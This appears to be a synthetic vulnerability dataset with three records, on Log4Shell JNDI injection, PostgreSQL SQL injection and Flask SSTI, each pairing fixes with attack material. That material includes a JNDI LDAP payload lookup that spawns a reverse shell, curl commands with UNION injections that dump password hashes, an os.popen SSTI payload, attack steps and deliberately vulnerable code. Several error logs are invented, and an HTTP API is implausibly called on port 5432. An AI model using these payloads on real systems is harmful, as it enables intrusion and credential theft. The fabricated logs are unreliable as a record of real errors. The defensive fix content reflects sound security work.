properties.description: Remote Code Execution in Spring Boot Employee Management application due to unvetted Log4j2 JNDI LDAP lookup parser.
properties.cause: Unrestricted JNDI message lookup evaluation allowing remote Java bytecode loading and execution over LDAP.
properties.rootCause: Apache Log4j2 message parser automatically resolves nested lookup expressions like ${jndi:ldap://...}. When untrusted employee search parameters are logged, the Java runtime connects to remote rogue LDAP servers and deserializes arbitrary Java bytecode.
properties.troubleshootingProcess: Grep /var/log/employeemgmt/app.log for "${jndi:"; inspect JVM socket connections on non-standard ports.
properties.fixExplanation: Enforced log4j2.formatMsgNoLookups=true, upgraded log4j-core dependency, and added strict regex validation for input parameters.
properties.errorMessage:
2026-09-24 14:22:01.304 WARN [http-nio-8080-exec-3] org.apache.logging.log4j.core.net.JndiManager:
Attempting lookup: ldap://192.168.10.200:1389/ExploitPayload
java.lang.ClassCastException: Rogue remote payload class loaded from LDAP directory
Outbound socket connected to remote attacker daemon. Reverse shell spawned on port 4444.
properties.label: Vulnerability
properties.verificationProcedure: Inject benign probe ${jndi:ldap://127.0.0.1/test}; verify application records literal text with zero outbound lookups.
properties.symptoms: Outbound LDAP connection initiated to remote address; reverse shell spawned in Java JVM context; rogue thread execution.
properties.installationProcedure: Send crafted HTTP request with ${jndi:ldap://...} expression to employee search endpoint triggering Log4j evaluation.
properties.fixSolution: Configure -Dlog4j2.formatMsgNoLookups=true and upgrade Spring Boot log4j-core library to version >= 2.17.1.
properties.name: Log4Shell / Spring Boot JNDI RCE

properties.description: Improper sanitization in customer search endpoint allowing dynamic SQL clause escaping, UNION dumping, and data exfiltration.
properties.cause: Dynamic SQL query string concatenation without parameterized prepared statement placeholders ($1).
properties.exploitScript:
curl -s -X POST "http://192.168.10.107:5432/api/customer/search" \
  -H "Content-Type: application/json" \
  -d '{"account_id": "ACC-99\' OR \'1\'=\'1\' UNION SELECT id, password_hash, 0 FROM admin_credentials--"}'
properties.rootCause: Dynamic SQL string concatenation directly interpolated untrusted user input without parameterized placeholders ($1), enabling quotation mark escaping and arbitrary SQL execution with database superuser privileges.
properties.troubleshootingProcess: Inspect /var/log/postgresql/postgresql-16-main.log for "syntax error at or near OR" and audit dynamic query functions.
properties.fixExplanation: Replaced insecure string concatenation with parameterized query EXECUTE ... USING $1, guaranteeing all user input is evaluated strictly as literal values.
properties.errorMessage:
PSQLException: ERROR: syntax error at or near "OR"
Position: 84
Payload injected: ' OR '1'='1' UNION SELECT id, password_hash, 999999 FROM auth_vault--
Extracted: 14,200 sensitive customer records dumped via SQL UNION injection.
properties.label: Vulnerability
properties.verificationProcedure: Execute SQL test probe "' OR '1'='1'--"; verify database handles input as literal text with zero data leakage.
properties.symptoms: Database CPU spikes; unauthorized exfiltration of 14,200 customer records; syntax error traces in postgresql.log.
properties.installationProcedure: Transmit crafted SQL payload with escaped quote delimiters to trigger arbitrary PostgreSQL function execution.
properties.fixSolution: Convert dynamic query to parameterized prepared statements with typed argument placeholders ($1).
properties.name: PostgreSQL SQL Injection & Dynamic Execution
properties.reproduction: curl -X POST "http://192.168.10.107:5432/api/customer/query" -d "account=' OR '1'='1' UNION SELECT id, password_hash, 999999 FROM auth_vault--"

properties.description: Server-Side Template Injection in Flask Internal Analytics API allowing arbitrary remote command execution via unescaped metric parameter.
properties.cause: Direct string formatting into render_template_string instead of passing variables via Jinja2 render context dictionary.
properties.rootCause: Flask's render_template_string function processes Jinja2 syntax within the template itself. Passing unvalidated user input via f-string string interpolation causes the template engine to compile user-supplied double-curly braces {{ ... }} into Python bytecode instructions.
properties.troubleshootingProcess: Inspect Flask gunicorn error logs for Jinja2 template compile errors; verify input sanitization on metric query parameter.
properties.fixExplanation: Migrated from render_template_string to static render_template with auto-escaping enabled and strict whitelist validation against allowed metric names.
properties.errorMessage:
jinja2.exceptions.TemplateRuntimeError: Remote code execution triggered
Payload evaluated: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
Output captured: uid=1001(flask_app) gid=1001(analytics) groups=1001(analytics)
Privilege escalation: /etc/shadow access attempt detected on API-COMP-21.
properties.label: Vulnerability
properties.verificationProcedure: Send SSTI probe "{{ 7 * 7 }}"; verify application renders literal string "{{ 7 * 7 }}" without evaluating arithmetic expression.
properties.symptoms: Arbitrary shell command output returned in analytics HTML; file read access to /etc/passwd; unauthorized API privilege elevation.
properties.installationProcedure: Transmit HTTP GET request with Jinja2 template interpolation syntax to trigger Python bytecode evaluation in Flask.
properties.fixSolution: Use render_template with isolated context dictionary passing and enforce whitelist validation on allowed metrics.
properties.name: Flask Jinja2 Server-Side Template Injection (SSTI)
properties.buggyCode:
# Vulnerable Flask Analytics Endpoint (analytics_report_generator.py) from flask import Flask, request, render_template_string app = Flask(__name__) @app.route('/api/analytics/report') def generate_report(): user_metric = request.args.get('metric', 'DailyTraffic') # FLAW: User input formatted directly into template string instead of context dict template = f"""

Analytics Report

Metric evaluated: {user_metric}

""" return render_template_string(template)
